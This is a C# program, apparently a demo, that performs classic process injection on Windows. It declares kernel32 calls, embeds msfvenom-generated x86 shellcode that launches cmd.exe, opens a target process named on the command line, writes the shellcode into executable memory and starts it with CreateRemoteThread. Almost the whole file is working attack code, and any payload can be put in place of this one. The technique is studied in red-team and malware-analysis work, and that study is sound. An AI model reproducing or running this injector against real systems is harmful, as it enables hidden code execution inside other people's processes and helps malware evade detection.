using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Diagnostics;

namespace process_injection_demo_csharp
{
  class Program
  {
    [Flags]
    public enum ProcessAccessFlags : uint
    {
      All = 0x001F0FFF,
      Terminate = 0x00000001,
      CreateThread = 0x00000002,
      VirtualMemoryOperation = 0x00000008,
      VirtualMemoryRead = 0x00000010,
      VirtualMemoryWrite = 0x00000020,
      DuplicateHandle = 0x00000040,
      CreateProcess = 0x000000080,
      SetQuota = 0x00000100,
      SetInformation = 0x00000200,
      QueryInformation = 0x00000400,
      QueryLimitedInformation = 0x00001000,
      Synchronize = 0x00100000
    }


    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


    // Memory allocation constants
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
      UIntPtr bytesWritten;
      // msfvenom -a x86 -platform windows -p windows/exec cmd=cmd.exe -b "\00\x0a\x0d" -f c
      string msf_sc =
      "\xdd\xc7\xd9\x74\x24\xf4\x5f\xba\x7c\x46\x2d\x9b\x29\xc9\xb1" +
      "\x31\x83\xc7\x04\x31\x57\x13\x03\x2b\x55\xcf\x6e\x2f\xb1\x8d" +
      "\x91\xcf\x42\xf2\x18\x2a\x73\x32\x7e\x3f\x24\x82\xf4\x6d\xc9" +
      "\x69\x58\x85\x5a\x1f\x75\xaa\xeb\xaa\xa3\x85\xec\x87\x90\x84" +
      "\x6e\xda\xc4\x66\x4e\x15\x19\x67\x97\x48\xd0\x35\x40\x06\x47" +
      "\xa9\xe5\x52\x54\x42\xb5\x73\xdc\xb7\x0e\x75\xcd\x66\x04\x2c" +
      "\xcd\x89\xc9\x44\x44\x91\x0e\x60\x1e\x2a\xe4\x1e\xa1\xfa\x34" +
      "\xde\x0e\xc3\xf8\x2d\x4e\x04\x3e\xce\x25\x7c\x3c\x73\x3e\xbb" +
      "\x3e\xaf\xcb\x5f\x98\x24\x6b\xbb\x18\xe8\xea\x48\x16\x45\x78" +
      "\x16\x3b\x58\xad\x2d\x47\xd1\x50\xe1\xc1\xa1\x76\x25\x89\x72" +
      "\x16\x7c\x77\xd4\x27\x9e\xd8\x89\x8d\xd5\xf5\xde\xbf\xb4\x93" +
      "\x21\x4d\xc3\xd6\x22\x4d\xcb\x46\x4b\x7c\x40\x09\x0c\x81\x83" +
      "\x6d\xe2\xcb\x89\xc4\x6b\x92\x58\x55\xf6\x25\xb7\x9a\x0f\xa6" + 
      "\x3d\x63\xf4\xb6\x34\x66\xb0\x70\xa5\x1a\xa9\x14\xc9\x89\xca" + 
      "\x3c\xaa\x40\x51\x91\x49\xe3\xfc\xed";

      // Convert string to byte array
      // TODO Replace this with the proper Encoding.Blah.GetBytes()
      Byte[] shellcode = new Byte[msf_sc.Length];
      for (int i = 0; i < msf_sc.Length; i++)
      {
        shellcode[i] = (Byte)msf_sc[i];
      }

      if (args.Length == 0)
      {
        System.Console.WriteLine("Please enter the name of the process you'd like to inject into");
        return;
      }

      Process targetProcess;

      try
      {
        targetProcess = Process.GetProcessesByName(args[0])[0];
      }
      catch
      {
        System.Console.WriteLine("Couldn't find process: " + args[0]);
        return;
      }

      IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, targetProcess.Id);
      IntPtr allocatedMemoryAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(hProcess, allocatedMemoryAddr, shellcode, (UInt32)shellcode.Length, out bytesWritten);
      CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemoryAddr, IntPtr.Zero, 0, IntPtr.Zero);
    }
  }
}
